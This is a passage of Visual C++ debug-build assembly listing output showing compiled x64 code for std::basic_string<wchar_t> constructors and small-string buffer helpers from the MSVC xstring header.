  00205	5d		 pop	 rbp
  00206	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z
_TEXT	SEGMENT
$T1 = 196
this$ = 256
_Right$ = 264
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2816 :         : _Mypair(_One_then_variadic_args_t{}, _STD move(_Right._Getal())) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  0002b	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00030	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00037	4c 8b c0	 mov	 r8, rax
  0003a	0f b6 95 c4 00
	00 00		 movzx	 edx, BYTE PTR $T1[rbp]
  00041	e8 00 00 00 00	 call	 ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >

; 2817 :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

  00046	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0004d	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  00054	48 8b c8	 mov	 rcx, rax
  00057	e8 00 00 00 00	 call	 ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2818 :         _Take_contents(_Right);

  0005c	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR _Right$[rbp]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents

; 2819 :     }

  0006f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00076	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0007d	5f		 pop	 rdi
  0007e	5d		 pop	 rbp
  0007f	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
_My_data$ = 8
$T1 = 228
this$ = 288
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty, COMDAT

; 2643 :     _CONSTEXPR20 void _Construct_empty() {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2644 :         auto& _My_data = _Mypair._Myval2;

  0001f	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 2645 :         _My_data._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

  0002a	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  00031	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00035	e8 00 00 00 00	 call	 ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2646 : 
; 2647 :         // initialize basic_string data members
; 2648 :         _My_data._Mysize = 0;

  0003a	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0003e	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00046	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0004a	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();

  00052	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00056	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer

; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0005b	33 c0		 xor	 eax, eax
  0005d	66 89 85 e4 00
	00 00		 mov	 WORD PTR $T1[rbp], ax
  00064	b8 02 00 00 00	 mov	 eax, 2
  00069	48 6b c0 00	 imul	 rax, rax, 0
  0006d	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00071	48 03 c8	 add	 rcx, rax
  00074	48 8b c1	 mov	 rax, rcx
  00077	48 8d 95 e4 00
	00 00		 lea	 rdx, QWORD PTR $T1[rbp]
  0007e	48 8b c8	 mov	 rcx, rax
  00081	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2654 :     }

  00086	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0008d	5f		 pop	 rdi
  0008e	5d		 pop	 rbp
  0008f	c3		 ret	 0
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
_TEXT	SEGMENT
_Al$ = 224
_Old_ptr$ = 232
_Capacity$ = 240
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity, COMDAT

; 2638 :         _Alty& _Al, const pointer _Old_ptr, const size_type _Capacity) noexcept {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2639 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2640 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  00030	48 ff c0	 inc	 rax
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Old_ptr$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00044	e8 00 00 00 00	 call	 ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ; std::allocator<wchar_t>::deallocate

; 2641 :     }

  00049	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00050	5f		 pop	 rdi
  00051	5d		 pop	 rbp
  00052	c3		 ret	 0
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
_TEXT	SEGMENT
$T1 = 196
this$ = 256
_Ptr$ = 264
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2556 :     _CONSTEXPR20 basic_string(_In_z_ const _Elem* const _Ptr) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	0f b6 95 c4 00
	00 00		 movzx	 edx, BYTE PTR $T1[rbp]
  00032	48 8b c8	 mov	 rcx, rax
  00035	e8 00 00 00 00	 call	 ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>

; 2557 :         _Construct<_Construct_strategy::_From_ptr>(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));

  0003a	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00041	e8 00 00 00 00	 call	 ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ; std::_WChar_traits<wchar_t>::length
  00046	48 8b c8	 mov	 rcx, rax
  00049	e8 00 00 00 00	 call	 ??$_Convert_size@_K_K@std@@YA_K_K@Z ; std::_Convert_size<unsigned __int64,unsigned __int64>
  0004e	4c 8b c0	 mov	 r8, rax
  00051	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  00058	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0005f	e8 00 00 00 00	 call	 ??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>

; 2558 :     }

  00064	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0006b	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00072	5f		 pop	 rdi
  00073	5d		 pop	 rbp
  00074	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
$T1 = 196
$T2 = 228
this$ = 288
_Right$ = 296
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2508 :         : _Mypair(_One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  0002b	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00030	48 8b d0	 mov	 rdx, rax
  00033	48 8d 8d c4 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  0003a	e8 00 00 00 00	 call	 ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
  0003f	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00046	4c 8b c0	 mov	 r8, rax
  00049	0f b6 95 e4 00
	00 00		 movzx	 edx, BYTE PTR $T2[rbp]
  00050	e8 00 00 00 00	 call	 ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00055	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0005c	48 8b c8	 mov	 rcx, rax
  0005f	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00064	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  0006b	4c 8b 41 10	 mov	 r8, QWORD PTR [rcx+16]
  0006f	48 8b d0	 mov	 rdx, rax
  00072	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00079	e8 00 00 00 00	 call	 ??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>

; 2510 :     }

  0007e	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00085	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0008c	5f		 pop	 rdi
  0008d	5d		 pop	 rbp
  0008e	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 196
this$ = 256
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2499 :     basic_string() noexcept(is_nothrow_default_constructible_v<_Alty>) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 95 c4 00
	00 00		 movzx	 edx, BYTE PTR $T1[rbp]
  0002d	48 8b c8	 mov	 rcx, rax
  00030	e8 00 00 00 00	 call	 ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>

; 2500 :         _Construct_empty();

  00035	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty

; 2501 :     }

  00041	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0001a	48 8b c8	 mov	 rcx, rax
  0001d	e8 00 00 00 00	 call	 ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf, COMDAT

; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2292 :             _STD _Destroy_in_place(_Ptr);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z ; std::_Destroy_in_place<wchar_t *>

; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty, COMDAT

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty, COMDAT

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b bd e0 00
	00 00		 mov	 rdi, QWORD PTR this$[rbp]
  0002d	33 c0		 xor	 eax, eax
  0002f	b9 10 00 00 00	 mov	 ecx, 16
  00034	f3 aa		 rep stosb
  00036	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003d	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00044	5f		 pop	 rdi
  00045	5d		 pop	 rbp
  00046	c3		 ret	 0
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer, COMDAT

; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
